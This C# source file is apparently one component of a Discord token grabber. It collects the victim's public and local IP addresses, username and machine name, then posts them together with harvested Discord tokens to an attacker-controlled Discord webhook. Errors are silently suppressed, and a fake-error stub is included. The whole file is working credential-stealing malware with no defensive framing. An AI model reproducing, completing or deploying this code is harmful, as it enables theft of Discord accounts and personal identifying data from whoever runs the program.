using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Token_Grabber
{
    public class PrintAllInfo
    {
        public static string weblink = ("https://api.ipify.org/");
        public static string internalip = "Nothing";
        public static string url = webhookinput.webhook;

        public PrintAllInfo()
        {
            SendInfo();
        }

        /// <summary>
        /// Get Local IP
        /// </summary>
        public static void GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    internalip = ip.ToString();
                }
            }
        }

        /// <summary>
        /// Sends info to discord webhook
        /// </summary>
        static void SendInfo()
        {
            GetLocalIPAddress();
            //Discord webhook url
            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":16745830}] }";

            string newjson = json.Insert(65, $"Public IP: {GetIp()}");
            newjson = newjson.Insert(79 + GetIp().Length, $"Local IP: {internalip}");
            newjson = newjson.Insert(92 + GetIp().Length + internalip.Length, $"Username: {Environment.UserName}");
            newjson = newjson.Insert(105 + Environment.UserName.Length + GetIp().Length + internalip.Length, $"PC Name: {Environment.MachineName}");


            //Filters through possible tokens
            foreach (string item in DiscordToken.matchs)
            {
                try
                {
                    string virtualjson = newjson.Insert(117 + GetIp().Length + Environment.UserName.Length + Environment.MachineName.Length + internalip.Length, $"\\n Token: {item}");
                    SendDiscordWebhook(url, virtualjson);
                }
                catch { }
            }

        }

        /// <summary>
        /// Method to send data to webhook
        /// </summary>
        /// <param name="URL"></param>
        /// <param name="escapedjson"></param>
        public static void SendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }

        /// <summary>
        /// Returns public ip
        /// </summary>
        public static string GetIp()
        {
            string ip = new WebClient().DownloadString(weblink);
            return ip;
        }

        public static string FakeErrorMsg(string error)
        {
            return error;
        }


    }
}
